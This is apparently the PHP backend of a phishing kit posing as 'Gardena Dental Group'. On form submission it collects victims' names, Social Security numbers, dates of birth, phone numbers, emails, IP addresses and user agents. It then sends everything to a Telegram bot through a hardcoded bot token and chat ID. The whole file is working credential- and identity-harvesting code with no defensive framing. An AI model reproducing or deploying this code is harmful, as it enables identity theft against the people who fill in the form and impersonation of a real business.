<?php
if (isset($_POST['submit'])) {
    // Sakupljanje podataka iz POST zahtjeva
    $firstName = $_POST['first_name'] ?? '';
    $lastName = $_POST['last_name'] ?? '';
    $phone = $_POST['phone'] ?? '';
    $email = $_POST['email'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $ssn = $_POST['ssn'] ?? '';  
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ipAddress = $_POST['ip_address'] ?? ''; 

    $message = "Gardena Dental Group\n\nFirst Name : $firstName\nLast Name : $lastName\nSSN : $ssn\nDOB : $dob\nPhone : $phone\nEmail : $email\n\nIP Address : $ipAddress\nUser Agent : $userAgent";
    $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
    $chatId = '-4151741751';
    $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
    $telegramData = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $chTelegram = curl_init($telegramUrl);
    curl_setopt($chTelegram, CURLOPT_POST, true);
    curl_setopt($chTelegram, CURLOPT_POSTFIELDS, http_build_query($telegramData));
    curl_setopt($chTelegram, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chTelegram, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    $telegramResponse = curl_exec($chTelegram);
    if ($telegramResponse === false) {
        echo "Error sending data to Telegram: " . curl_error($chTelegram);
    }
    curl_close($chTelegram);
}
?>